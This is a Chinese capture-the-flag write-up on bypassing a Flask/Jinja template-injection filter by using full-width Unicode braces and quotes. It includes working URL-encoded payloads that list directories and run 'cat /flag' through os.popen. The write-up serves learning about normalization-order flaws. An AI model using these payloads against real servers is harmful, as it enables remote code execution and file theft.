ailx10说：这篇是我2024年12月写的。easy\_web 给了数学花体的提示，我才开始往 Unicode 和规范化上想。普通括号、引号被过滤，那换成全角字符会怎样？顺着这个方向试，输入终于到了 Flask 模板求值的那一层，后面才有继续列目录和读取结果的空间。这篇记的是从一个看似装饰性的提示，转到字符表示差异的过程。它不是“换全角就能绕所有过滤”的结论，而是提醒我：输入经过几次解码、规范化和检查，先后顺序一变，同一个字符在不同环节眼里就可能不一样。

---

全角左花括号 ｛ 为 U\+FF5B，UTF-8 百分号编码为 %EF%BD%9B；右花括号 ｝ 为 U\+FF5D，编码为 %EF%BD%9D。全角单引号 ＇ 为 U\+FF07，编码为 %EF%BC%87。

难度系数：5（官方难度：5）

![](/notes-assets/710974cce16724e21186.webp)

使用 Burp Suite 抓包发现服务端是 Python/3.7.12，POST请求内容是很奇怪的内容，观察第一个字符 是一个特殊的字母符号，它属于Unicode标准中的“数学字母数字符号”（Mathematical Alphanumeric Symbols）区块。具体来说， 是花体（script）大写 L，但是很遗憾，这个字体里面没有`{}`和`'`。

```
%E2%84%92%E2%84%AF%E2%84%B4%F0%9D%93%83%F0%9D%92%B6%F0%9D%92%93%F0%9D%92%B9%F0%9D%98%B0
```

![](/notes-assets/7268420abbf82a21f7ab.webp)

尝试模版注入，发现被拦截了，多次尝试，发现是`{}` 这2个符号被拦截了。

![](/notes-assets/809f6855e44ed2c1c750.webp)

使用全角 `｛｛ config ｝｝` ，发现模版注入成功，惊喜。

全角左花括号 ｛：U\+FF5B，UTF-8 编码 %EF%BD%9B；全角右花括号 ｝：U\+FF5D，UTF-8 编码 %EF%BD%9D。

![](/notes-assets/1a0a58bf56be85dc6ccf.webp)

![](/notes-assets/83796837891adda03222.webp)

查看当前目录的文件，这里`'`（单引号）也被限制了，所以我置空了，但是没有发现flag相关信息。

```
str=%EF%BD%9B%EF%BD%9B+config.__class__.__init__.__globals__.os.listdir()+%EF%BD%9D%EF%BD%9D
```

![](/notes-assets/14375c4789797efdecc9.webp)

还是使用相同的策略，全角字符绕过，查看`/`（根目录），注意这里的单引号，是类似全角花括号那种全角单引号`＇`， Unicode 编码是 U\+FF07**，**URL 编码是：`%EF%BC%87`

```
%EF%BD%9B%EF%BD%9B+config.__class__.__init__.__globals__.os.listdir(＇/＇)+%EF%BD%9D%EF%BD%9D 
```

![](/notes-assets/5fc57c4831deb168e5cb.webp)

打印 flag，结束

```
%EF%BD%9B%EF%BD%9B+config.__class__.__init__.__globals__.os.popen(＇cat%20/flag＇).read()+%EF%BD%9D%EF%BD%9D
```

![](/notes-assets/80f2a1c5a6c5a0a96278.webp)

全角符号只有经过服务端转换后才可能被模板识别；Jinja 不会天然将全角括号当作模板定界符。

换一种字形能走通，并不只是输入框里“长得不一样”。真正需要记下的是字符在何处被改变、又在哪一层参与求值，这样下次才有办法自己发现类似差异。
